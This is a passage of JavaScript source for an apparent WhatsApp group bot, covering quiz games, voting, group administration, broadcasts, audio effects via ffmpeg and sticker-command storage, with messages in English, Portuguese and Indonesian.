await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
client.sendButtonText(m.chat, [{ buttonId: 'guess saying', buttonText: { displayText: 'Guess The Saying' }, type: 1 }], `Time Out\nAnswer:  ${caklontong[m.sender.split('@')[0]]}\nDescription : ${caklontong_desk[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break
            case 'kuismath': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
let { genMath, modes } = require('./lib/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
client.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
  kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
  console.log("Answer: " + result.jawaban)
  m.reply("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
  delete kuismath[m.sender.split('@')[0]]
}
            }
            break
            
            case 'slot': {
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            let sloth =`[  🎰VIRTUAL SLOT 🎰  ]\n------------------------\n\n🍒 : 🍌 : 🍇\n${somtoy}<=====\n🍇 : 🍌 : 🍒\n\n------------------------\n[  🎰 VIRTUAL SLOT 🎰  ]\n\n*Information* :\n_If you get 3 of the same fruit_\n_Means You Win_\n\n_Example : 🍒 : 🍒 : 🍒_ <=====`
            let buttons = [{ buttonId: 'slot', buttonText: { displayText: '🎰PLAY AGAIN🎰' }, type: 1 }]
            await client.sendButtonText(m.chat, buttons, sloth, botname, m)
            }
            break
            case 'soulmate': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
{ buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
            }
            break
            case 'couple': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`
            let menst = [orang, jodoh]
            let buttons = [
{ buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
            }
            break
            case 'buttonmaker': {
            if (!isPremium) throw mess.premime
			if (!text) throw `Example : ${prefix + command} hi|hello`
            let jawab = `${text.split("|")[0]}`
            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `⫹⫺` }, type: 1 }]
            await client.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
            case 'can': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} i dance?`
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
let keh = bisa[Math.floor(Math.random() * bisa.length)]
let jawab = `*Can ${text}*\nAnswer : ${keh}`
let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT🗿' }, type: 1 }]
            await client.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
        
            
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
await client.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
            	}
            break
            case 'req': case 'request': {
            	if (!text) throw `Example : ${prefix + command} Fitur Min`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${command} ${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS' }, type: 1 }]
            await client.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments, quoted: fdoc})
            let akhji = `*Request has been sent*\n*To Owner @${ownernya.split('@')[0]}*\n_Thank you🙏_`
            await client.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments, quoted: fkontak})
            }
            break
            case 'react': {
if (!isCreator) throw mess.owner
reactionMessage = {
  react: {
text: args[0],
key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
  }
}
client.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
if (!isCreator) throw mess.owner
if (!text) throw 'Enter the group link!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await client.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leavegc': {
if (!isCreator) throw mess.owner
await client.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif has been successfully changed to\n\n⫹⫺ Packname : ${global.packname}\n⫹⫺ Author : ${global.author}`)
            }
            break
	case 'ban': {
		if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await client.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await client.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': case 'pm': {
		if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await client.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Promovido com sucesso!')).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': case 'dm': {
		if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await client.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Rebaixado com sucesso!')).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await client.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await client.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setnome': case 'setsubject': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Text ?'
await client.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Text ?'
await client.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
if (!isCreator) throw mess.owner
if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
let media = await client.downloadAndSaveMediaMessage(quoted)
await client.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break
           case 'setgp': case 'setgruppp': case 'setgcpp': {
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
let media = await client.downloadAndSaveMediaMessage(quoted)
await client.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break
            case 'tagall': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let teks = `⊙─〔 ıll TᗩGᗩᒪᒪ llı 〕─⊙
 
*PESAN:* *❑─( ${q ? q : 'empty'} )─❑*\n\n`
for (let mem of participants) {
teks += `⫹⫺ @${mem.id.split('@')[0]}\n`
}
client.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'hidetag': case 'ht': {
            if (!m.isGroup) m.reply(mess.group)
            if (!isBotAdmins) m.reply(mess.botAdmin)
            if (!isAdmins) m.reply(mess.admin)
            client.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // response when limit runs out
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Enter Query text!'
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
  teks += `⫹⫺ *${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`
            if (!text) throw `Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - for sure\n*${prefix}devote* - for devote\n*${prefix}cekvote* - to check the vote\n*${prefix}deletevote* - to delete votes`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}deletevote* - to delete votes`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
text: teks_vote,
footer: client.user.name,
buttons: buttonsVote,
headerType: 1
            }
            client.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You have Voted'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
text: teks_vote,
footer: client.user.name,
buttons: buttonsUpvote,
headerType: 1,
mentions: menvote
             }
            client.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You have Voted'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
text: teks_vote,
footer: client.user.name,
buttons: buttonsDevote,
headerType: 1,
mentions: menvote
            }
            client.sendMessage(m.chat, buttonMessageDevote)
	}
            break
 
case 'checkvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${client.user.id}
`
client.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            delete vote[m.chat]
            m.reply('Successfully Deleted Vote Session In This Group')
	    }
            break
               case 'group': case 'grupo': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'close'){
  await client.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Fechado com sucesso!*`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
  await client.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Aberto com sucesso!*`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Abrir' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Fechar' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `O que você deseja?`, botname, m)

             }
            }
            break
            case 'editinfo': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
await client.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
await client.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)

            }
            }
            break
  case 'nsfw': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfw) return m.reply('Já está ativado')
ntnsfw.push(from)
m.reply('Avtivado com sucesso!')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
client.sendMessage(from, {text: `\`\`\`「 ⚠️Aviso Geral⚠️ 」\`\`\`\n\nO recurso Nsfw (não seguro) foi ativado neste grupo, o que significa que se pode acessar gráficos sexuais a partir do bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return m.reply('Já está desativado')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
m.reply('Desativado com sucesso!')
} else {
  let buttonsntnsfw = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttonsntnsfw, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinkgc': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink) return m.reply(`*It's Been Active Before*`)
db.data.chats[m.chat].antilink = true
m.reply(`*Antilink Now Active !*`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink) return m.reply(`*Not Activated Before*`)
db.data.chats[m.chat].antilink = false
m.reply(`*Antilink Now Inactive !*`)
} else {
 let buttons = [
{ buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `Mode Antilink`, botname, m)
}
             }
             break
             case 'mute': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return m.reply(`It's Been Active Before`)
db.data.chats[m.chat].mute = true
m.reply(`${client.user.name} has been muted in this group !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return m.reply(`Not Activated Before`)
db.data.chats[m.chat].mute = false
m.reply(`${client.user.name} has been unmuted in this group !`)
} else {
 let buttons = [
{ buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await client.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
}
             }
             break
case 'chatinfo': {
if (!m.quoted) m.reply('Reply Message')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) return m.reply('The message was not sent by a bot!')
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `${global.themeemoji} @${i.userJid.split('@')[0]}\n`
teks += ` ┗━${global.themeemoji} *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ${global.themeemoji} *Status :* ${read ? 'Read' : 'Sent'}\n\n`
}
client.sendTextWithMentions(m.chat, teks, m)
}
break

            case 'linkgp': case 'linkgc': case 'link': case 'grouplink': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
let response = await client.groupInviteCode(m.chat)
client.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink de : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Enter the value enable/disable'
if (args[0] === 'enable') {
  await client.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'disable') {
  await client.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
            }
            break
            case 'delete': case 'd': {
if (!m.quoted) throw false
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'report': case 'bug': case'reportar': {
            	if (!text) throw `kalo kamu nemu pesan eror Silahkan ${prefix + command} pake perintah ini  contoh: #report selamat siang owner, Saya Menemukan Fitur eror`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Mensagem de : @${me.split('@')[0]} \nPara : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: '#owner', buttonText: { displayText: 'Desenvolvedor' }, type: 1 }]
            await client.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
            let akhji = `Report Enviado\nPara Dev @${ownernya.split('@')[0]}\n_Obrigado por reportar!"_\n_Spam = Block Permanente!!_`
            await client.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
            }
            break
            case 'hehehe': {
reactionMessage = {
  react: {
text: '❤',
key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
  }
}
client.sendMessage(m.chat, reactionMessage)
            }
            break  
            break
 case 'bc': case 'broadcast':
			    if (!isCreator) throw mess.owner
		            if (args.length < 2) throw `Text Nya mana?`
		    var data = await store.chats.all()
    for (let i of data) {
       client.sendMessage(i.id, {text: `𝘛𝘳𝘢𝘯𝘴𝘮𝘪𝘴𝘴𝘢̃𝘰 𝘥𝘰 𝘋𝘦𝘷\n\n${q}\n\nDev: ${ownername}` })
       await sleep(1000)
    }
    break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Responda uma mensagem!!')
		let wokwol = await client.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('A mensagem que você respondeu não contém respota.')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *PERSONAL CHAT LIST*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
   let nama = store.messages[i].array[0].pushName
   teks += `⫹⫺ *Name :* ${nama}\n⫹⫺ *User :* @${i.split('@')[0]}\n⫹⫺ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 client.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *GROUP CHAT LIST*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
   let metadata = await client.groupMetadata(i)
   teks += `⫹⫺ *Name :* ${metadata.subject}\n⫹⫺ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n⫹⫺ *ID :* ${metadata.id}\n⫹⫺ *Made :* ${moment(metadata.creation * 1000).tz('America/Fortaleza').format('DD/MM/YYYY HH:mm:ss')}\n⫹⫺ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 client.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
  let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
  let online = [...Object.keys(store.presences[id]), botNumber]
  client.sendText(m.chat, 'Online List:\n\n' + online.map(v => ' @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
        case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
m.reply(mess.wait)
let media = await client.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
client.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
m.reply(e)
}
break
            case 'setcmd': {
if (!m.quoted) throw 'Reply Message!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `For What Command?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
  text,
  mentionedJid: m.mentionedJid,
  creator: m.sender,
  at: + new Date,
  locked: false,
}
m.reply(`Done!`)
            }
            break
            case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `No hashes`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
delete global.db.data.sticker[hash]
m.reply(`Done!`)
            }
            break
            case 'listcmd': {
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
client.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'antilink':
if (!m.isGroup) return m.reply('Só em grupos')
if (!isAdmins) return m.reply('Só adm')
if (!isBotAdmins) return m.reply('Bot n é adm')
if (args.length < 1) return m.reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiLinkHard) return m.reply('Ja esta ativo')
antilinkhard.push(from)
fs.writeFileSync('./datab/ants/antilinkhard.json', JSON.stringify(antilinkhard))
m.reply('_Ativado com sucesso!_')
} else if (Number(args[0]) === 0) {
if (!isAntiLinkHard) return m.reply('Ja esta Desativado')
pesquisar = from
processo = antilinkhard.indexOf(pesquisar)
while(processo >= 0){
antilinkhard.splice(processo, 1)
processo = antilinkhard.indexOf(pesquisar)
}
fs.writeFileSync('./datab/ants/antilinkhard.json', JSON.stringify(antilinkhard))
m.reply('_Desativou com sucesso!_')
} else {
m.reply('1 para ativar, 0 para desativar')
}
break
            case 'lockcmd': {
if (!isCreator) throw mess.owner
if (!m.quoted) throw 'Reply Message!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
m.reply('Done!')
            }
            break
            case 'addmsg': {
if (!m.quoted) throw 'Reply Message You Want To Save In Database'
if (!text) throw `Example : ${prefix + command} filename`
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) throw `'${text}' registered in the message list`
msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
